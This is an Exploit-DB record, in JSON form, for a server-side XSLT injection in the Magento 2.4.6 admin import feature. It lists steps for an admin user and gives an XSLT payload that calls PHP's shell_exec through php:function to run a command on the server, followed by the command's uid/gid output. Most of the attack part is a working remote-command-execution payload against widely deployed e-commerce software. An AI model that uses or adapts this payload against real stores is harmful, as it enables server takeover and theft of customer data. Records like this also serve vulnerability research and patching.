{"source": "https://www.exploit-db.com/exploits/51847", "vulnName": "Magento ver. 2.4.6 - XSLT Server Side Injection", "vulnEDBID": "51847", "vulnCVE": "N/A", "author": "TMRSWRR", "exploitType": "WEBAPPS", "platform": "MULTIPLE", "datePublished": "2024-03-03", "vulnContent": "# Exploit Title: Magento ver. 2.4.6 - XSLT Server Side Injection\nDate:** 2023-11-17\nExploit Author:** tmrswrr\nVendor Homepage:** [https://magento2demo.firebearstudio.com/](https://magento2demo.firebearstudio.com/)\nSoftware Link:** [Magento 2.4.6-p3](https://github.com/magento/magento2/archive/refs/tags/2.4.6-p3.zip)\nVersion:** 2.4.6\nTested on:** 2.4.6\n\n## POC\n\n1. Enter with admin credentials to this URL: [https://magento2demo.firebearstudio.com/](https://magento2demo.firebearstudio.com/)\n2. Click `SYSTEM > Import Jobs > Entity Type Widget > click edit`\n3. Choose Import Source is File\n4. Click `XSLT Configuration` and write this payload:\n\n   ```xml\n   <?xml version=\"1.0\" encoding=\"utf-8\"?>\n   <xsl:stylesheet version=\"1.0\"\n   xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n   xmlns:php=\"http://php.net/xsl\">\n     <xsl:template match=\"/\">\n       <xsl:value-of select=\"php:function('shell_exec','id')\" />\n     </xsl:template>\n   </xsl:stylesheet>```\n\n##RESULT\n  \n**<?xml version=\"1.0\"?>\n**uid=10095(a0563af8) gid=1050(a0563af8) groups=1050(a0563af8)\n            "}